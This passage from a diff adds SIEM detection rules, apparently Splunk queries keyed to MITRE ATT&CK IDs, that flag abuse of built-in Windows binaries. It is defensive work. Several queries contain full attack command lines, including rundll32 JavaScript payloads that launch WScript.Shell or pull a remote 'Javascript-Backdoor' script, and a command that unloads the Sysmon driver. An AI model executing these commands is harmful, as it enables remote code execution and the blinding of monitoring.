+        "query": "(index=\"windows\") AND (InstallUtil.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Ldifde.exe",
+        "query": "(index=\"windows\") AND (Ldifde)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: MpCmdRun.exe",
+        "query": "(index=\"windows\") AND (MpCmdRun.exe -DownloadFile -url -path)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: MSAccess.exe",
+        "query": "(index=\"windows\") AND (MSAccess.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Msedge.exe",
+        "query": "(index=\"windows\") AND (msedge.exe *)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Mshta.exe",
+        "query": "(index=\"windows\") AND (mshta.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: MsoHtmEd.exe",
+        "query": "(index=\"windows\") AND (MsoHtmEd.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Mspub.exe",
+        "query": "(index=\"windows\") AND (mspub.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Ngen.exe",
+        "query": "(index=\"windows\") AND (ngen.exe http*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: OneDriveStandaloneUpdater.exe",
+        "query": "(index=\"windows\") AND (OneDriveStandaloneUpdater)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Powerpnt.exe",
+        "query": "(index=\"windows\") AND (Powerpnt.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: PrintBrm.exe",
+        "query": "(index=\"windows\") AND (PrintBrm -b -d)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: ProtocolHandler.exe",
+        "query": "(index=\"windows\") AND (ProtocolHandler.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Replace.exe",
+        "query": "(index=\"windows\") AND (replace.exe OR replace)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Scrobj.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Shimgvw.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Visio.exe",
+        "query": "(index=\"windows\") AND (Visio.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: winget.exe",
+        "query": "(index=\"windows\") AND (winget.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: WinProj.exe",
+        "query": "(index=\"windows\") AND (WinProj.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Winword.exe",
+        "query": "(index=\"windows\") AND (winword.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1113: Psr.exe",
+        "query": "(index=\"windows\") AND (psr.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127.001: Msbuild.exe",
+        "query": "(index=\"windows\") AND (msbuild.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: AppCert.exe",
+        "query": "(index=\"windows\") AND (appcert.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Aspnet_Compiler.exe",
+        "query": "(index=\"windows\") AND (*\\aspnet_compiler.exe -v none -p)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Cdb.exe",
+        "query": "(index=\"windows\") AND (cdb.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Csc.exe",
+        "query": "(index=\"windows\") AND (csc.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: csi.exe",
+        "query": "(index=\"windows\") AND (csi.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Devtoolslauncher.exe",
+        "query": "(index=\"windows\") AND (devtoolslauncher.exe LaunchForDeploy)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Dfshim.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe dfshim.dll,ShOpenVerbApplication)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Dfsvc.exe",
+        "query": "(index=\"windows\") AND (rundll32.exe dfshim.dll,ShOpenVerbApplication)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: dnx.exe",
+        "query": "(index=\"windows\") AND (dnx.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Dxcap.exe",
+        "query": "(index=\"windows\") AND (Dxcap.exe -c)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Ilasm.exe",
+        "query": "(index=\"windows\") AND (ilasm.exe /exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1127: Ilasm.exe-1",
+        "query": "ilasm.exe /dll",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Jsc.exe",
+        "query": "(index=\"windows\") AND (jsc.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Mftrace.exe",
+        "query": "(index=\"windows\") AND (Mftrace.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Microsoft.NodejsTools.PressAnyKey.exe",
+        "query": "(index=\"windows\") AND (Microsoft.NodejsTools.PressAnyKey.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Microsoft.Workflow.Compiler.exe",
+        "query": "(index=\"windows\") AND (Microsoft.Workflow.Compiler.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: rcsi.exe",
+        "query": "(index=\"windows\") AND (rcsi.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Remote.exe",
+        "query": "(index=\"windows\") AND (Remote.exe /s)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Remote.exe Powershell",
+        "query": "(index=\"windows\") AND (Remote.exe /s \"powershell.exe\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: te.exe",
+        "query": "(index=\"windows\") AND (te.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Tracker.exe",
+        "query": "(index=\"windows\") AND (Tracker.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Ttdinject.exe",
+        "query": "(index=\"windows\") AND (TTDInject.exe /ClientParams)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1127: Ttdinject.exe-1",
+        "query": "ttdinject.exe /ClientScenario TTDRecorder /ddload /ClientParams",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Tttracer.exe",
+        "query": "(index=\"windows\") AND (tttracer.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: vbc.exe",
+        "query": "(index=\"windows\") AND (vbc.exe /target:exe *.vb)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1127: vbc.exe-1",
+        "query": "vbc -reference:Microsoft.VisualBasic.dll *.vb",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: VSDiagnostics.exe",
+        "query": "(index=\"windows\") AND (VSDiagnostics.exe start)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Vshadow.exe",
+        "query": "(index=\"windows\") AND (vshadow.exe -exec=*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: vsjitdebugger.exe",
+        "query": "(index=\"windows\") AND (Vsjitdebugger.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: vstest.console.exe",
+        "query": "(index=\"windows\") AND (vstest.console.exe *.dll)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1127: Wfc.exe",
+        "query": "(index=\"windows\") AND (wfc.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1187: Rpcping.exe",
+        "query": "(index=\"windows\") AND (rpcping /s /e /a /u)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Bash.exe",
+        "query": "(index=\"windows\") AND (bash.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Conhost.exe",
+        "query": "(index=\"windows\") AND (conhost.exe --headless)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Diskshadow.exe",
+        "query": "(index=\"windows\") AND (diskshadow* exec)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Explorer.exe",
+        "query": "(index=\"windows\") AND (explorer.exe /root*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Forfiles.exe",
+        "query": "(index=\"windows\") AND (forfiles /p)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Ftp.exe",
+        "query": "(index=\"windows\") AND (ftp -s:*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: OpenConsole.exe",
+        "query": "(index=\"windows\") AND (OpenConsole.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Pcalua.exe",
+        "query": "(index=\"windows\") AND (pcalua.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Procdump.exe",
+        "query": "(index=\"windows\") AND (procdump.exe -md)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Scriptrunner.exe",
+        "query": "(index=\"windows\") AND (Scriptrunner.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: ssh.exe",
+        "query": "(index=\"windows\") AND (ssh localhost)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1202: ssh.exe-1",
+        "query": "ssh -o ProxyCommand=*",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Unregmp2.exe",
+        "query": "(index=\"windows\") AND (rmdir)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: winfile.exe",
+        "query": "(index=\"windows\") AND (winfile.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Wlrmdr.exe",
+        "query": "(index=\"windows\") AND (wlrmdr.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: Wsl.exe",
+        "query": "(index=\"windows\") AND (wsl.exe -e)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1202: Wsl.exe-1",
+        "query": "wsl.exe -u",
+        "sevirity": 4
+    },
+    {
+        "name": "T1202: Wsl.exe-2",
+        "query": "wsl.exe --exec bash -c",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1202: wt.exe",
+        "query": "(index=\"windows\") AND (wt.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1216.001: Pubprn.vbs",
+        "query": "(index=\"windows\") AND (pubprn.vbs)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1216.002: Syncappvpublishingserver.vbs",
+        "query": "(index=\"windows\") AND (SyncAppvPublishingServer.vbs)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1216: CL_Invocation.ps1",
+        "query": "(index=\"windows\") AND (\\nSyncInvoke)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1216: CL_LoadAssembly.ps1",
+        "query": "(index=\"windows\") AND (powershell.exe -command)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1216: CL_Mutexverifiers.ps1",
+        "query": "(index=\"windows\") AND (C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1216: Launch-VsDevShell.ps1",
+        "query": "(index=\"windows\") AND (powershell -ep RemoteSigned -f)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1216: Launch-VsDevShell.ps1-1",
+        "query": "powershell -ep RemoteSigned -f",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1216: Manage-bde.wsf",
+        "query": "(index=\"windows\") AND (set comspec=* cscript c:\\windows\\system32\\manage-bde.wsf)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1216: Manage-bde.wsf-1",
+        "query": "copy *\\manage-bde.exe cscript.exe *\\manage-bde.wsf",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1216: Pester.bat",
+        "query": "(index=\"windows\") AND (Pester.bat ;*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1216: winrm.vbs",
+        "query": "(index=\"windows\") AND (winrm invoke)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.002: Control.exe",
+        "query": "(index=\"windows\") AND (control.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.003: Cmstp.exe",
+        "query": "(index=\"windows\") AND (cmstp.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.007: Devinit.exe",
+        "query": "(index=\"windows\") AND (devinit.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.007: Msiexec.exe",
+        "query": "(index=\"windows\") AND (msiexec /quiet)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.007: Msiexec.exe-1",
+        "query": "msiexec /q /i",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.007: Msiexec.exe-2",
+        "query": "msiexec /y",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.007: Msiexec.exe-3",
+        "query": "msiexec /z",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.008: Odbcconf.exe",
+        "query": "(index=\"windows\") AND (odbcconf)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.009: Regasm.exe",
+        "query": "(index=\"windows\") AND (regasm.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.009: Regsvcs.exe",
+        "query": "(index=\"windows\") AND (regsvcs.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.010: Regsvr32.exe",
+        "query": "(index=\"windows\") AND (regsvr32 /s /n /u /i:*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Advpack.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe advpack.dll,LaunchINFSection)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Advpack.dll-1",
+        "query": "rundll32.exe advpack.dll,RegisterOCX",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Advpack.dll-2",
+        "query": "rundll32 advpack.dll, RegisterOCX",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Desk.cpl",
+        "query": "(index=\"windows\") AND (rundll32.exe desk.cpl,InstallScreenSaver)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Ieadvpack.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe ieadvpack.dll,LaunchINFSection)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Ieadvpack.dll-1",
+        "query": "rundll32.exe ieadvpack.dll,RegisterOCX",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Ieadvpack.dll-2",
+        "query": "rundll32 ieadvpack.dll, RegisterOCX",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Ieframe.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe ieframe.dll,OpenURL)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Mshtml.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe Mshtml.dll,PrintHTML)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Pcwutl.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe pcwutl.dll,LaunchApplication)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Rundll32.exe",
+        "query": "(index=\"windows\") AND (rundll32.exe AllTheThingsx64,EntryPoint)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Rundll32.exe-1",
+        "query": "rundll32.exe *,EntryPoint",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Rundll32.exe-2",
+        "query": "rundll32.exe javascript:\"\\..\\mshtml.dll,RunHTMLApplication \";eval(\"w=new%20ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\");",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Rundll32.exe-3",
+        "query": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").run(\"calc.exe\",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Rundll32.exe-4",
+        "query": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\")",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Rundll32.exe-5",
+        "query": "rundll32.exe -sta",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Setupapi.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe setupapi.dll,InstallHinfSection)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Shdocvw.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe shdocvw.dll,OpenURL)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Shell32.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe shell32.dll,Control_RunDLL)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Shell32.dll-1",
+        "query": "rundll32.exe shell32.dll,ShellExec_RunDLL",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Shell32.dll-2",
+        "query": "rundll32 SHELL32.DLL,ShellExec_RunDLL",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Syssetup.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe syssetup.dll,SetupInfObjectInstallAction)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Syssetup.dll-1",
+        "query": "rundll32 syssetup.dll,SetupInfObjectInstallAction",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Url.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe url.dll,OpenURL)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218.011: Url.dll-1",
+        "query": "rundll32.exe url.dll,FileProtocolHandler",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.011: Zipfldr.dll",
+        "query": "(index=\"windows\") AND (rundll32.exe zipfldr.dll,RouteTheCall)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.012: Verclsid.exe",
+        "query": "(index=\"windows\") AND (verclsid.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.013: Mavinject.exe",
+        "query": "(index=\"windows\") AND (MavInject.exe 3110)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.014: Mmc.exe",
+        "query": "(index=\"windows\") AND (mmc.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.015: msedgewebview2.exe",
+        "query": "(index=\"windows\") AND (msedgewebview2.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218.015: Teams.exe",
+        "query": "(index=\"windows\") AND (teams.exe --disable-gpu-sandbox --gpu-launcher=*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: AccCheckConsole.exe",
+        "query": "(index=\"windows\") AND (AccCheckConsole.exe -window)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: AddinUtil.exe",
+        "query": "(index=\"windows\") AND (AddinUtil)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: AgentExecutor.exe",
+        "query": "(index=\"windows\") AND (AgentExecutor.exe -powershell)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Appvlp.exe",
+        "query": "(index=\"windows\") AND (AppVLP.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Atbroker.exe",
+        "query": "(index=\"windows\") AND (ATBroker.exe /start)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Bginfo.exe",
+        "query": "(index=\"windows\") AND (bginfo.exe bginfo.bgi /popup /nolicprompt)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218: Bginfo.exe-1",
+        "query": "bginfo.exe bginfo.bgi /popup /nolicprompt",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218: Bginfo.exe-2",
+        "query": "\\\\*\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218: Bginfo.exe-3",
+        "query": "\\\\*\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218: Bginfo.exe-4",
+        "query": "\\\\*\\Tools\\bginfo.exe \\\\*\\webdav\\bginfo.bgi /popup /nolicprompt",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218: Bginfo.exe-5",
+        "query": "\\\\*\\Tools\\bginfo.exe \\\\*\\webdav\\bginfo.bgi /popup /nolicprompt",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: CertOC.exe",
+        "query": "(index=\"windows\") AND (certoc OR certoc.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: CustomShellHost.exe",
+        "query": "(index=\"windows\") AND (CustomShellHost.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: DefaultPack.EXE",
+        "query": "(index=\"windows\") AND (DefaultPack.EXE)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Dotnet.exe",
+        "query": "(index=\"windows\") AND (dotnet.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Extexport.exe",
+        "query": "(index=\"windows\") AND (Extexport.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Fsutil.exe",
+        "query": "(index=\"windows\") AND (fsutil.exe trace decode)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Gpscript.exe",
+        "query": "(index=\"windows\") AND (Gpscript /logon)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1218: Gpscript.exe-1",
+        "query": "Gpscript /startup",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Ie4uinit.exe",
+        "query": "(index=\"windows\") AND (ie4uinit.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: iediagcmd.exe",
+        "query": "(index=\"windows\") AND (set windir=*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Infdefaultinstall.exe",
+        "query": "(index=\"windows\") AND (InfDefaultInstall.exe Infdefaultinstall.inf)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Msconfig.exe",
+        "query": "(index=\"windows\") AND (Msconfig.exe -5)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Msdeploy.exe",
+        "query": "(index=\"windows\") AND (msdeploy.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Msdt.exe",
+        "query": "(index=\"windows\") AND (msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: OfflineScannerShell.exe",
+        "query": "(index=\"windows\") AND (OfflineScannerShell)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Pcwrun.exe",
+        "query": "(index=\"windows\") AND (Pcwrun.exe OR Pcwrun)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Presentationhost.exe",
+        "query": "(index=\"windows\") AND (Presentationhost.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Provlaunch.exe",
+        "query": "(index=\"windows\") AND (provlaunch.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Rasautou.exe",
+        "query": "(index=\"windows\") AND (rasautou -d powershell.dll -p powershell -a a -e e)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Register-cimprovider.exe",
+        "query": "(index=\"windows\") AND (Register-cimprovider -path)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Runexehelper.exe",
+        "query": "(index=\"windows\") AND (runexehelper.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Runonce.exe",
+        "query": "(index=\"windows\") AND (Runonce.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Runscripthelper.exe",
+        "query": "(index=\"windows\") AND (runscripthelper.exe surfacecheck)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Setres.exe",
+        "query": "(index=\"windows\") AND (setres.exe -w -h)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: SettingSyncHost.exe",
+        "query": "(index=\"windows\") AND (SettingSyncHost)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Sqlps.exe",
+        "query": "(index=\"windows\") AND (Sqlps.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: SQLToolsPS.exe",
+        "query": "(index=\"windows\") AND (SQLToolsPS.exe -noprofile -command)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Squirrel.exe",
+        "query": "(index=\"windows\") AND (squirrel.exe OR squirrel)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Stordiag.exe",
+        "query": "(index=\"windows\") AND (stordiag.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Update.exe",
+        "query": "(index=\"windows\") AND (Update.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: VisualUiaVerifyNative.exe",
+        "query": "(index=\"windows\") AND (VisualUiaVerifyNative.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: VSIISExeLauncher.exe",
+        "query": "(index=\"windows\") AND (VSIISExeLauncher.exe -p)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: vsls-agent.exe",
+        "query": "(index=\"windows\") AND (vsls-agent.exe --agentExtensionPath)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Wab.exe",
+        "query": "(index=\"windows\") AND (wab.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Wmic.exe",
+        "query": "(index=\"windows\") AND (wmic.exe process get brief /format:*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: WorkFolders.exe",
+        "query": "(index=\"windows\") AND (WorkFolders)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: wuauclt.exe",
+        "query": "(index=\"windows\") AND (wuauclt.exe /UpdateDeploymentProvider /RunHandlerComServer)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1218: Xwizard.exe",
+        "query": "(index=\"windows\") AND (xwizard RunWizard)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1219: code.exe",
+        "query": "(index=\"windows\") AND (code.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1220: msxsl.exe",
+        "query": "(index=\"windows\") AND (msxsl.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1220: winrm.vbs",
+        "query": "(index=\"windows\") AND (*\\winrm.vbs get)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1485: Fsutil.exe",
+        "query": "(index=\"windows\") AND (fsutil.exe file *.dll)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1485: Fsutil.exe-1",
+        "query": "fsutil.exe usn",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1543.003: Dnscmd.exe",
+        "query": "(index=\"windows\") AND (dnscmd.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1546.007: Netsh.exe",
+        "query": "(index=\"windows\") AND (netsh.exe add helper)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1547: Pnputil.exe",
+        "query": "(index=\"windows\") AND (pnputil.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1548.002: Eventvwr.exe",
+        "query": "(index=\"windows\") AND (eventvwr.exe OR eventvwr)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1548.002: Eventvwr.exe-1",
+        "query": "ysoserial.exe",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1548.002: Wsreset.exe",
+        "query": "(index=\"windows\") AND (wsreset.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1562.001: fltMC.exe",
+        "query": "(index=\"windows\") AND (fltMC.exe unload SysmonDrv)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Bitsadmin.exe",
+        "query": "(index=\"windows\") AND (bitsadmin)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Cmd.exe",
+        "query": "(index=\"windows\") AND (cmd.exe /c echo regsvr32.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Cscript.exe",
+        "query": "(index=\"windows\") AND (cscript)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Diantz.exe",
+        "query": "(index=\"windows\") AND (diantz.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1564.004: Extrac32.exe",
+        "query": "(index=\"windows\") AND (extrac32)",
+        "sevirity": 4
+    },
+    {
